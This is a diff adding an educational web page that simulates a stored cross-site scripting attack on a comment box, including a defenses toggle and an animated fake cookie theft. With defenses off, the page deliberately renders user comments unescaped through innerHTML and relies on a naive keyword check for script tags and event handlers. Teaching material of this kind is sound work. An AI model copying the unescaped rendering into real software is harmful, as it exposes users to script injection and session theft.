+            document.getElementById('prevBtn').disabled = currentStep === 1;
+            document.getElementById('nextBtn').disabled = currentStep === totalSteps;
+            if (currentStep === totalSteps) {
+                document.getElementById('nextBtn').textContent = '✓ Complete';
+            }
+
+            updateStepIndicator();
+            updateProgress();
+        }
+
+        function updateStepIndicator() {
+            // Reset all dots
+            document.querySelectorAll('.step-dot').forEach(dot => {
+                dot.classList.remove('active', 'completed');
+            });
+            
+            // Set current
+            document.querySelector(`.step-dot[data-step="${currentStep}"]`).classList.add('active');
+            
+            // Set completed
+            for (let i = 1; i < currentStep; i++) {
+                document.querySelector(`.step-dot[data-step="${i}"]`).classList.add('completed');
+            }
+        }
+
+        function updateProgress() {
+            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
+            document.getElementById('progressFill').style.width = `${progress}%`;
+        }
+
+        // Comment System
+        function addInitialComments() {
+            const initialComments = [
+                { author: 'Sarah Chen', text: 'Great insights on zero-trust architecture!', avatar: 'SC', malicious: false },
+                { author: 'Mike Rodriguez', text: 'Has anyone implemented MFA across their entire org?', avatar: 'MR', malicious: false }
+            ];
+
+            initialComments.forEach(comment => {
+                renderComment(comment);
+            });
+        }
+
+        function postComment() {
+            const input = document.getElementById('commentInput');
+            const text = input.value.trim();
+
+            if (!text) {
+                input.style.borderColor = '#ff4757';
+                setTimeout(() => input.style.borderColor = '#ddd', 2000);
+                return;
+            }
+
+            const newComment = {
+                author: 'You',
+                text: text,
+                avatar: 'YO',
+                malicious: defensesOn ? false : (text.includes('<script') || text.includes('onerror') || text.includes('onload'))
+            };
+
+            if (newComment.malicious && !defensesOn) {
+                // Execute XSS
+                executeXSS(text);
+            }
+
+            renderComment(newComment);
+            input.value = '';
+        }
+
+        function renderComment(comment) {
+            const section = document.getElementById('commentsSection');
+            const commentDiv = document.createElement('div');
+            commentDiv.className = 'comment';
+
+            let displayText = comment.text;
+            let textClass = 'comment-text';
+
+            if (defensesOn && (comment.text.includes('<') || comment.text.includes('>'))) {
+                // Safe rendering - encode HTML
+                displayText = escapeHtml(comment.text);
+                textClass += ' safe';
+            } else if (comment.malicious && !defensesOn) {
+                textClass += ' malicious';
+            }
+
+            commentDiv.innerHTML = `
+                <div class="comment-author">
+                    <div class="comment-avatar">${comment.avatar}</div>
+                    <span>${comment.author}</span>
+                </div>
+                <div class="${textClass}">${displayText}</div>
+            `;
+
+            section.appendChild(commentDiv);
+            section.scrollTop = section.scrollHeight;
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        function executeXSS(payload) {
+            // Show alert
+            setTimeout(() => {
+                document.getElementById('alertModal').classList.add('active');
+            }, 500);
+
+            // Steal cookie animation
+            setTimeout(() => {
+                stealCookie();
+            }, 2000);
+        }
+
+        function closeAlert() {
+            document.getElementById('alertModal').classList.remove('active');
+        }
+
+        function stealCookie() {
+            // Show attacker server
+            document.getElementById('attackerServer').classList.add('active');
+
+            // Create cookie animation
+            const cookie = document.createElement('div');
+            cookie.className = 'cookie-animation flying';
+            cookie.textContent = '🍪';
+            cookie.style.left = '50%';
+            cookie.style.top = '50%';
+
+            document.querySelector('.sandbox-panel').appendChild(cookie);
+
+            // Update stolen cookies display
+            setTimeout(() => {
+                const stolenCookiesDiv = document.getElementById('stolenCookies');
+                const fakeCookie = `session_id=${generateRandomString(16)}; user=admin; token=${generateRandomString(32)}`;
+                stolenCookiesDiv.innerHTML = `<div style="color: #ff4757; margin-bottom: 5px;">⚠️ COOKIE STOLEN:</div>${fakeCookie}`;
+            }, 1500);
+
+            // Remove cookie element after animation
+            setTimeout(() => {
+                cookie.remove();
+            }, 2000);
+        }
+
+        function generateRandomString(length) {
+            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+
+        function toggleDefenses() {
+            defensesOn = !defensesOn;
+            const btn = document.getElementById('toggleDefenseBtn');
+            const status = document.getElementById('defenseStatus');
+
+            if (defensesOn) {
+                btn.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+                btn.style.color = '#fff';
+                status.textContent = 'ON';
+                
+                // Clear malicious comments
+                const comments = document.querySelectorAll('.comment');
+                comments.forEach(c => c.remove());
+                addInitialComments();
+            } else {
+                btn.style.background = '';
+                btn.style.color = '';
+                status.textContent = 'OFF';
+            }
+        }
+
+        // Allow Enter key to post
+        document.getElementById('commentInput').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                postComment();
+            }
+        });
+    </script>
+</body>
+</html>
